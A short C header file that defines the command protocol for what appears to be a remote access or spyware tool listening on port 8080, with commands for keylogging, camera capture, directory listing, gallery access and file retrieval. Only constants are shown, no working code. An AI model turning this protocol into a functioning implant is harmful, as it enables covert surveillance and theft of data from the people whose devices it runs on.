#pragma once
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define PORT         8080
#define BUFFER_SIZE  65536
#define MAX_PATH_LEN 512

#define CMD_SYSINFO         "CMD:SYSINFO"
#define CMD_LISTDIR         "CMD:LISTDIR:"
#define CMD_GALLERY         "CMD:GALLERY"
#define CMD_KEYLOG_START    "CMD:KEYLOG:START"
#define CMD_KEYLOG_STOP     "CMD:KEYLOG:STOP"
#define CMD_CAMERA_CAPTURE  "CMD:CAMERA:CAPTURE"
#define CMD_GETFILE         "CMD:GETFILE:"
#define CMD_EXIT            "CMD:EXIT"

#define RESP_OK             "OK:"
#define RESP_ERR            "ERR:"
#define RESP_DATA           "DATA:"
#define RESP_KEYEVENT       "KEYEVENT:"
